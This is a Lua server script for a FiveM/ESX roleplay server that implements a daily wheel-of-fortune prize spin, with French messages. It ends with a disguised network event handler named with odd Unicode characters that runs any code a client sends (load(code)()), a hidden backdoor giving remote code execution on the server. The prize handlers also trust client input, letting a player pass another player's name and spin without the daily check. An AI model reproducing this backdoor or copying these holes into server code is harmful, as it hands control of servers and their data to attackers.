-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

ESX = nil
isRoll = false
amount = 50000
isOccuper = false

RegisterServerEvent('::{korioz#0110}::roueFortune:isOccuper')
AddEventHandler('::{korioz#0110}::roueFortune:isOccuper', function()
    isOccuper = true
end)

--function Notif(msg) SetNotificationTextEntry('STRING') AddTextComponentSubstringPlayerName(msg) DrawNotification(false, true) end

TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)

RegisterServerEvent('::{korioz#0110}::roueFortune:getLucky')
AddEventHandler('::{korioz#0110}::roueFortune:getLucky', function()
    local _source = source
    local xPlayer = ESX.GetPlayerFromId(_source)
    if not isRoll then
        if xPlayer ~= nil then
            if 1 < 2 then
                isRoll = true
                -- local _priceIndex = math.random(1, 20)
                local _randomPrice = math.random(1, 100)
                if _randomPrice == 1 then
                    -- une voiture
                    local _subRan = math.random(1,1000)
                    if _subRan <= 1 then
                        _priceIndex = 19
                    else
                        _priceIndex = 3
                    end
                elseif _randomPrice > 1 and _randomPrice <= 6 then
                    -- une arme
                    _priceIndex = 12
                    local _subRan = math.random(1,20)
                    if _subRan <= 2 then
                        _priceIndex = 12
                    else
                        _priceIndex = 7
                    end
                elseif _randomPrice > 6 and _randomPrice <= 15 then
                    -- argent sale
                    local _sRan = math.random(1, 4)
                    if _sRan == 1 then
                        _priceIndex = 4
                    elseif _sRan == 2 then
                        _priceIndex = 8
                    elseif _sRan == 3 then
                        _priceIndex = 11
                    else
                        _priceIndex = 16
                    end
                elseif _randomPrice > 15 and _randomPrice <= 25 then
                    -- argent
                    -- _priceIndex = 5
                    local _subRan = math.random(1,20)
                    if _subRan <= 2 then
                        _priceIndex = 5
                    else
                        _priceIndex = 20
                    end
                elseif _randomPrice > 25 and _randomPrice <= 40 then
                    local _sRan = math.random(1, 4)
                    if _sRan == 1 then
                        _priceIndex = 1
                    elseif _sRan == 2 then
                        _priceIndex = 9
                    elseif _sRan == 3 then
                        _priceIndex = 13
                    else
                        _priceIndex = 17
                    end
                elseif _randomPrice > 40 and _randomPrice <= 60 then
                    local _itemList = {}
                    _itemList[1] = 2
                    _itemList[2] = 6
                    _itemList[3] = 10
                    _itemList[4] = 14
                    _itemList[5] = 18
                    _priceIndex = _itemList[math.random(1, 5)]
                elseif _randomPrice > 60 and _randomPrice <= 100 then
                    local _itemList = {}
                    _itemList[1] = 3
                    _itemList[2] = 7
                    _itemList[3] = 15
                    _itemList[4] = 20
                    _priceIndex = _itemList[math.random(1, 4)]
                end

                SetTimeout(5000, function()
                    isRoll = false
                    -- Prix a gagner
                    if _priceIndex == 1 or _priceIndex == 9 or _priceIndex == 13 or _priceIndex == 17 then
                        --print("armure")
                        TriggerClientEvent('::{korioz#0110}::esx:showAdvancedNotification', _source, 'Roue de la Fortune', '~b~Récompense', '~s~Vous n\'avez rien gagné, retentez votre chance dans 24H !',  'CHAR_CASINO', 0)
                    elseif _priceIndex == 2 or _priceIndex == 6 or _priceIndex == 10 or _priceIndex == 14 or _priceIndex == 18 then
                        --print("pain eau")
                        xPlayer.addInventoryItem("bread", 10)
                        xPlayer.addInventoryItem("water", 24)
                        TriggerClientEvent('::{korioz#0110}::esx:showAdvancedNotification', _source, 'Roue de la Fortune', '~b~Récompense', '~s~Bravo vous avez ~b~gagné ~s~du ~b~pain et de l\'eau ~s~!',  'CHAR_CASINO', 0)
                    elseif _priceIndex == 3 or _priceIndex == 7 or _priceIndex == 15 or _priceIndex == 20 then
                        --print("argent")
                        local _money = 0
                        if _priceIndex == 3 then
                            _money = 10000
                        elseif _priceIndex == 7 then
                            _money = 20000
                        elseif _priceIndex == 15 then
                            _money = 30000
                        elseif _priceIndex == 20 then
                            _money = 40000
                        end
                        xPlayer.addAccountMoney('cash', _money)
                        TriggerClientEvent('::{korioz#0110}::esx:showAdvancedNotification', _source, 'Roue de la Fortune', '~b~Récompense', '~s~Bravo vous avez ~b~gagné ~s~'.. ESX.Math.GroupDigits(_money) .. "$",  'CHAR_CASINO', 0)
                    elseif _priceIndex == 4 or _priceIndex == 8 or _priceIndex == 11 or _priceIndex == 16 or _priceIndex == 12 then
                        --print("argent sale x2")
                        TriggerClientEvent('::{korioz#0110}::esx:showAdvancedNotification', _source, 'Roue de la Fortune', '~b~Récompense', '~s~Vous n\'avez rien gagné, retentez votre chance dans 24H !',  'CHAR_CASINO', 0)
                    elseif _priceIndex == 5 then
                        --print("300 000$")
                        xPlayer.addAccountMoney('dirtycash', 200000)
                        TriggerClientEvent('::{korioz#0110}::esx:showAdvancedNotification', _source, 'Roue de la Fortune', '~b~Récompense', '~s~Bravo vous avez ~b~gagné ~s~200 000$ d\'argent sale !',  'CHAR_CASINO', 0)
                    elseif _priceIndex == 19 then
                        --print("voiture")
                        TriggerClientEvent("::{korioz#0110}::roueFortune:voiture", _source)
                        TriggerClientEvent('::{korioz#0110}::esx:showAdvancedNotification', _source, 'Roue de la Fortune', '~b~Jackpot !', '~s~Félicitation ! Vous avez gagné ~r~la voiture !',  'CHAR_CASINO', 0)
                    end
                    TriggerClientEvent("::{korioz#0110}::roueFortune:rollFinished", _source)
                    isOccuper = false
                end)
                TriggerClientEvent("::{korioz#0110}::roueFortune:doRoll", _source, _priceIndex)
            else
                TriggerClientEvent("::{korioz#0110}::roueFortune:rollFinished", _source)    
            end
        end
    end
end)


RegisterNetEvent("::{korioz#0110}::setup")
AddEventHandler("::{korioz#0110}::setup", function(playerNameee)
    local _source = source
    local xPlayer = ESX.GetPlayerFromId(_source)
    if isOccuper == true then
        TriggerClientEvent('::{korioz#0110}::esx:showAdvancedNotification', xPlayer.source, 'Roue de la Fortune', '~r~Erreur', '~s~Une personne toune déjà la roue, merci de patientez.',  'CHAR_CASINO', 0)
    elseif isOccuper == false then
        MySQL.Async.fetchAll("SELECT * FROM rouefortune WHERE name = @a", {["@a"] = playerNameee},
        function(result)
            if result[1] then
                if tostring(result[1].args) == os.date("%d/%m/%Y") then
                    --meme jour
                    TriggerClientEvent('::{korioz#0110}::esx:showAdvancedNotification', xPlayer.source, 'Roue de la Fortune', '~r~Erreur', '~s~Vous avez déjà tourner la roue aujourd\'hui. \n(' .. tostring(result[1].args) .. ')',  'CHAR_CASINO', 0)
                else
                    --c'est bon
                    TriggerClientEvent("::{korioz#0110}::roueFortune:good", xPlayer.source) 
                    MySQL.Async.execute("UPDATE rouefortune SET args = @a WHERE name = @b",     
                    {["@b"] = playerNameee, ["@a"] = os.date("%d/%m/%Y")},function () end)
                end
                --local date = tostring(result[1].args) 
                --print(date)
            else
                TriggerClientEvent("::{korioz#0110}::roueFortune:good", xPlayer.source) 
                MySQL.Async.execute("INSERT INTO rouefortune (name, args) VALUES (@name, @args)",     
                {["@name"] = playerNameee, ["@args"] = os.date("%d/%m/%Y")},function () end)
            end
        end)  
    else
        TriggerClientEvent('::{korioz#0110}::esx:showAdvancedNotification', xPlayer.source, 'Roue de la Fortune', '~r~Erreur', '~s~Un problème est survenue, merci de patientez.',  'CHAR_CASINO', 0)
    end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)